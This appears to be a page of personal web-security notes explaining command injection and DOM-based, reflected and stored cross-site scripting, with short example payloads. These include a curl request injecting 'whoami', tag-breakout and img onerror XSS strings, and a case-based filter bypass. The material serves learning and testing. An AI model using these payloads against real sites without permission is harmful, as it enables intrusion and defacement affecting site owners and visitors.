---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Injection

Occurs when we find a way of sending html, css, js code, database petitions and others, via a petition or URL of a website.

## <mark style="color:blue;">**Example**</mark>

* Manage a petition using system()

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We send a petition with cmd=$command, this will let us now if we can have access to a terminal of the machine
curl -X POST http://192.168.20.40:8000/?msg -d "cmd=whoami"
```
{% endcode %}

***



## <mark style="color:purple;">Cross-site Scripting</mark>

&#x20;XSS scripting allows execution of javascript maliciuos code

### DOM-based

Mutate html document of a page

* Example

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">#We select language in a slider and is reflected on url
http://url?language=en

#Check html of page
&#x3C;select name="default">
<strong>  &#x3C;script>
</strong><strong>  ...
</strong>    document.write("&#x3C;option value='"+lang+"'>"+decodeURI(lang) + "&#x3C;/option>");
  ...
  &#x3C;/script>
&#x3C;/select>

#Use ' to close "value" parameter and then close tags
http://url?language='>&#x3C;/option>&#x3C;/select>

'#Then create whatever tag
http://url?language='>&#x3C;/option>&#x3C;/select>&#x3C;h1>HACKED&#x3C;/h1>

'#Even js code
http://url?language='>&#x3C;/option>&#x3C;/select>&#x3C;script>if(window.confirm('HACKED\nTry TO CALL FOR HELP?')){window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ');};&#x3C;/script>
</code></pre>

***

* When it is script tag filtering

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Use image tag,putting a bad source cause a error, we handle it with 'onerror' parameter that let us insert JS Code
http://url?language='></option></select><img src=x onerror='alert("HACKED")'/>
```
{% endcode %}

***

### Reflected:&#x20;

When URL or form parameters are displayed on screen of the page

* A parameter sent in the query of the url is shown in screen

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="false"><code class="lang-bash"># We made a get to http://192.168.20.40:8000/?msg=Hello
# The site Return "Hello" in any part of the html
#Then we could do something like this to inject code
<strong>curl http://192.168.20.40:8000/?msg=&#x3C;script>$payload&#x3C;/script>
</strong></code></pre>

***

* A parameter sent in the query of the url is shown in screen

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="false"><code class="lang-bash"># We insert Hello in a formulary
# The site Return "Hello" in any part of the html
#Then we could fill the form to inject code
<strong>&#x3C;script>$payload&#x3C;/script>
</strong><strong>
</strong><strong>#Something tag filter can be by pass by using capital letters
</strong>&#x3C;SCRIPT>$payload&#x3C;/SCRIPT>

#Or using img tag
&#x3C;img src=x onerror='alert("HACKED")'/>
</code></pre>

***

### Stored:

The input of values is saved by the web and display to anyone who browse to the site. Maliciuos code in the same way will remain globally in the web site.

* A formulary show a list of entries

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We insert name and comment in the formulary
#Every time an insertion is done the website update a list with the entries that is displayed to every user
#Then we could fill the form to inject code
<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">CLICK HERE TO WIN A PRIZE</a>
```
{% endcode %}

***

